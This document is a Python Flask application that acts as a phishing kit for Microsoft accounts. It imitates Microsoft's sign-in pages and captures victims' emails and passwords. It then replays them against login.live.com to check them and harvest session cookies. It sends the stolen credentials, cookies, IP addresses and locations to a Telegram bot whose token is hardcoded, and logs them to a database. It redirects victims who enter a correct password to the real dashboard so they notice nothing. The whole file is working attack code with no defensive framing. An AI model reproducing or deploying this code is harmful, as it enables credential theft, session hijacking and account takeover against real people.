from flask import Flask, request, redirect, send_file
import sqlite3
import datetime
import json
import requests
import secrets
import os
from bs4 import BeautifulSoup

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)

DB_NAME = "logs.db"

# ================== TELEGRAM CONFIG ==================
TELEGRAM_BOT_TOKEN = "8734219301:AAGfhOSH3e35l5oJk4tyWuOPM1ao12HHR_k"
TELEGRAM_CHAT_ID = "8689962848"
# ====================================================

# Key Microsoft authentication cookies (ESTSAUTH family is the most important for session)
IMPORTANT_COOKIES_KEYWORDS = ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT', 'x-ms', '.AspNetCore', 'MSISAuth', 'stsservicecookie']

def get_location(ip):
    if not ip or ip in ['127.0.0.1', '::1', 'localhost']:
        return {"city": "Local", "country": "Local", "isp": "Local"}
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,lat,lon,isp,query", timeout=6)
        if r.status_code == 200 and r.json().get("status") == "success":
            return r.json()
    except:
        pass
    return {"city": "Unknown", "country": "Unknown", "isp": "Unknown"}

def send_telegram_message(message):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"}, timeout=10)
    except:
        pass

def send_telegram_document(filename, caption):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        with open(filename, 'rb') as f:
            requests.post(url, files={'document': f}, data={'chat_id': TELEGRAM_CHAT_ID, 'caption': caption}, timeout=30)
    except:
        pass

def init_db():
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS captured_data (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            email TEXT,
            password TEXT,
            cookies TEXT,
            ip TEXT,
            location TEXT,
            user_agent TEXT,
            login_success INTEGER DEFAULT 0
        )
    ''')
    try:
        cursor.execute("ALTER TABLE captured_data ADD COLUMN login_success INTEGER DEFAULT 0")
    except sqlite3.OperationalError:
        pass
    conn.commit()
    conn.close()

init_db()

def get_client_ip():
    return (request.headers.get('CF-Connecting-IP') or
            request.headers.get('X-Forwarded-For', '').split(',')[0].strip() or
            request.headers.get('X-Real-IP') or request.remote_addr)

@app.route('/')
def home():
    return send_file('index.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email', '').strip()
    password = request.form.get('password', '').strip()
    ip = get_client_ip()
    user_agent = request.headers.get('User-Agent', 'unknown')

    if not email or not password:
        return redirect('/', code=302)

    location = get_location(ip)
    location_str = f"{location.get('city', 'Unknown')}, {location.get('country', 'Unknown')}"

    # === Real Microsoft Login Attempt ===
    success = False
    cookies_dict = {}
    final_url = ""
    important_cookies = {}
    important_count = 0

    try:
        s = requests.Session()
        s.headers.update({
            'User-Agent': user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
        })

        # Get login page
        resp = s.get("https://login.live.com/login.srf", timeout=15)
        soup = BeautifulSoup(resp.text, 'html.parser')

        form_data = {tag['name']: tag.get('value', '') for tag in soup.find_all('input', attrs={'name': True})}

        form_data.update({
            'loginfmt': email,
            'login': email,
            'passwd': password,
        })

        action = soup.find('form')
        action_url = action.get('action') if action and action.get('action') else "https://login.live.com/ppsecure/post.srf"
        if not action_url.startswith('http'):
            action_url = "https://login.live.com" + action_url

        # Submit login
        login_resp = s.post(action_url, data=form_data, allow_redirects=True, timeout=25)

        cookies_dict = {c.name: c.value for c in s.cookies}
        final_url = login_resp.url

        # Count important session cookies
        important_cookies = {name: value for name, value in cookies_dict.items() 
                             if any(kw in name for kw in IMPORTANT_COOKIES_KEYWORDS)}
        important_count = len(important_cookies)

        # Success detection (when password is correct)
        url_lower = final_url.lower()
        dashboard_indicators = ['account.microsoft.com', 'myaccount.microsoft.com', 'account.live.com']

        if any(ind in url_lower for ind in dashboard_indicators) and important_count >= 2:
            success = True
        elif important_count >= 3:   # Strong session cookies = successful login
            success = True
        else:
            success = False

        print(f"[DEBUG] Final URL: {final_url[:100]}... | Important cookies: {important_count} | Success: {success}")

    except Exception as e:
        print(f"Login attempt error: {e}")
        success = False

    # ============== TELEGRAM NOTIFICATION ==============
    status = "✅ PASSWORD CORRECT - SESSION CAPTURED" if success else "❌ WRONG PASSWORD"

    message = f"""
🔐 <b>MICROSOFT LOGIN - PASSWORD CHECK</b> 🔐

━━━━━━━━━━━━━━━━━━━━━━
📧 <b>CREDENTIALS</b>
├─ Email: <code>{email}</code>
├─ Password: <code>{password}</code>
└─ Status: {status}

━━━━━━━━━━━━━━━━━━━━━━
🍪 <b>IMPORTANT SESSION COOKIES ({important_count})</b>
"""

    if important_cookies:
        for name, value in list(important_cookies.items())[:10]:
            short = value[:60] + "..." if len(value) > 60 else value
            message += f"├─ <b>{name}</b>: <code>{short}</code>\n"
    else:
        message += "├─ No important session cookies\n"

    message += f"""
━━━━━━━━━━━━━━━━━━━━━━
🌐 <b>VICTIM INFO</b>
├─ IP: <code>{ip}</code>
├─ Location: {location_str}
├─ Total Cookies: {len(cookies_dict)}
└─ Time: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""

    send_telegram_message(message)

    # Save data
    data = {
        "timestamp": datetime.datetime.now().isoformat(),
        "email": email,
        "password": password,
        "ip": ip,
        "location": location,
        "user_agent": user_agent,
        "success": success,
        "final_url": final_url,
        "important_cookies": important_count,
        "cookies": cookies_dict,
        "important_cookies_only": important_cookies
    }

    json_file = f"ms_{email.split('@')[0]}_{datetime.datetime.now().strftime('%H%M%S')}.json"
    with open(json_file, 'w') as f:
        json.dump(data, f, indent=2)
    send_telegram_document(json_file, f"Microsoft - {email} - {status}")
    os.remove(json_file)

    # Save to DB
    conn = sqlite3.connect(DB_NAME)
    conn.execute('''
        INSERT INTO captured_data 
        (timestamp, email, password, cookies, ip, location, user_agent, login_success)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    ''', (
        datetime.datetime.now().isoformat(),
        email,
        password,
        json.dumps(cookies_dict),
        ip,
        json.dumps(location),
        user_agent,
        1 if success else 0
    ))
    conn.commit()
    conn.close()

    # ============== VICTIM REDIRECTION ==============
    if success:
        # Password correct → redirect to real Microsoft dashboard
        return redirect("https://account.microsoft.com/", code=302)
    else:
        # Wrong password → show error and allow retry
        return f"""
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <title>Sign in to your account</title>
            <style>
                * {{ margin:0; padding:0; box-sizing:border-box; }}
                body {{ font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif; background:#f1f1f1; min-height:100vh; display:flex; align-items:center; justify-content:center; padding:20px; }}
                .card {{ background:white; border-radius:8px; box-shadow:0 2px 12px rgba(0,0,0,0.12); padding:44px 40px 48px; max-width:440px; width:100%; }}
                .logo {{ width:108px; margin-bottom:24px; }}
                h1 {{ font-size:24px; font-weight:600; margin-bottom:16px; }}
                .sub-heading {{ font-size:14px; color:#5e5e5e; margin-bottom:32px; }}
                .error {{ color:#d13438; background:#fde7e9; padding:12px 16px; border-radius:4px; margin-bottom:24px; }}
                input {{ width:100%; padding:12px; border:1px solid #8c8c8c; border-radius:4px; font-size:16px; margin-bottom:20px; }}
                .button-primary {{ background:#0078d4; color:white; border:none; border-radius:4px; padding:12px; font-size:15px; font-weight:600; width:100%; cursor:pointer; }}
                .links a {{ color:#0078d4; text-decoration:none; }}
            </style>
        </head>
        <body>
        <div class="card">
            <img class="logo" src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft">
            <h1>Enter password</h1>
            <div class="sub-heading">for <strong>{email}</strong></div>
            
            <div class="error">The password you entered is incorrect.</div>
            
            <form method="POST" action="/login">
                <input type="hidden" name="email" value="{email}">
                <input type="password" name="password" placeholder="Password" autofocus required>
                <button type="submit" class="button-primary">Sign in</button>
            </form>
            
            <div class="links" style="margin-top:20px; font-size:13px;">
                <a href="/">Use another account</a>
            </div>
        </div>
        </body>
        </html>
        """

if __name__ == '__main__':
    print("=" * 70)
    print("Microsoft Login Capture - Real Login + Dashboard Redirect")
    print("URL: http://localhost:5000/")
    print("=" * 70)
    app.run(host='0.0.0.0', port=5000, debug=False)